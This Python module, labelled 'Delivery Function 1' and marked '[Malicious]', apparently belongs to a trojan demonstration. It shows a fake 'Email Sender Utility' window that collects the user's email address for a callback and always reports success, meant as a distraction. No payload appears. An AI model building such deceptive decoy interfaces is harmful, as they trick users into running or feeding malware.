"""
Delivery Function 1: Show Email GUI
Displays legitimate-looking interface to distract user
"""

import tkinter as tk
from tkinter import messagebox
import threading
import time

def show_email_gui(on_send_callback):
    """
    Display legitimate-looking email GUI
    Args:
        on_send_callback: Function to call when user clicks send
    """
    print("[Malicious] Function 1: Showing email GUI to user...")
    
    global email_window, email_entry
    
    email_window = tk.Tk()
    email_window.title("Email Sender Utility v2.0")
    email_window.geometry("400x250")
    email_window.resizable(False, False)
    
    # Create GUI elements
    title_label = tk.Label(email_window, text="Quick Email Sender", 
                          font=("Arial", 16, "bold"))
    title_label.pack(pady=20)
    
    instruction_label = tk.Label(email_window, 
                                text="Enter your email address to send a test message:",
                                font=("Arial", 10))
    instruction_label.pack(pady=10)
    
    email_entry = tk.Entry(email_window, width=40, font=("Arial", 11))
    email_entry.pack(pady=10)
    email_entry.insert(0, "your.email@example.com")
    
    def on_send_clicked():
        user_email = email_entry.get()
        
        if not user_email or '@' not in user_email:
            messagebox.showerror("Error", "Please enter a valid email address")
            return
        
        # Show sending message
        messagebox.showinfo("Sending", "Sending email, please wait...")
        
        # Call the callback function with user email
        on_send_callback(user_email)
        
        # Wait a moment
        time.sleep(1)
        
        # Show success
        messagebox.showinfo("Success", "Email sent successfully!")
        
        # Close window after a moment
        email_window.after(2000, email_window.destroy)
    
    send_button = tk.Button(email_window, text="Send Test Email", 
                           command=on_send_clicked, 
                           bg="#4CAF50", fg="white",
                           font=("Arial", 11, "bold"),
                           width=20, height=2)
    send_button.pack(pady=20)
    
    return email_window
